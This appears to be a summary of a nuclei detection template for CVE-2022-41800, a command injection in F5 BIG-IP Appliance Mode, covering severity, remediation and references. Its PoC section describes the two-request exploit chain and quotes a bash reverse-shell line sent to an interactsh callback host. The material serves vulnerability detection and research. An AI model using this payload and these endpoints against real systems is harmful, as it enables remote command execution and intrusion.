---
cve_id: CVE-2022-41800
template_path: nuclei-templates/http/cves/2022/CVE-2022-41800.yaml
affected_product: F5 BIG-IP Appliance Mode
severity: high
authentication: required
external_callback: true
affected_versions: unknown
preconditions: running in Appliance mode; authenticated Administrator role
poc_classification: rce
---

## Vulnerability
F5 BIG-IP Appliance Mode has a command injection vulnerability (CVE-2022-41800, CWE-77). When running in Appliance mode, an authenticated user assigned the Administrator role may bypass Appliance mode restrictions, utilizing an undisclosed iControl REST endpoint. 

CVSS score: 8.7 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N)
Impact: A successful exploit can allow the attacker to execute remote commands on the server using authorization bypass (CVE-2022-1388).
Remediation: Apply security patches from F5 Networks as outlined in K97843387 and ensure Appliance mode restrictions are properly enforced.

## PoC / Detection
Classification: rce

The template actively exploits the issue with two sequential authenticated POST requests using Basic Auth (admin:random) and X-F5-Auth-Token:
1. `POST /mgmt/shared/iapp/rpm-spec-creator` crafts a malicious JSON payload containing an RPM spec whose `description` field injects a `%check` section with `bash -i >& /dev/tcp/{{interactsh-url}}/port 0>&1`.
2. `POST /mgmt/shared/iapp/build-package` triggers the RPM build using the extracted `specFilePath`, executing the injected command.

Success is verified by an OOB DNS callback on interactsh plus response body keywords "RUN_BUILD_RPM_TASK" and "shared:iapp:build-package:buildrpmtaskstate". The template is intrusive.

## References
- https://attackerkb.com/topics/ZClTQn4aG4/cve-2022-41800/rapid7-analysis
- https://support.f5.com/csp/article/K97843387
- https://support.f5.com/csp/article/K13325942
- https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
- https://nvd.nist.gov/vuln/detail/cve-2022-41800
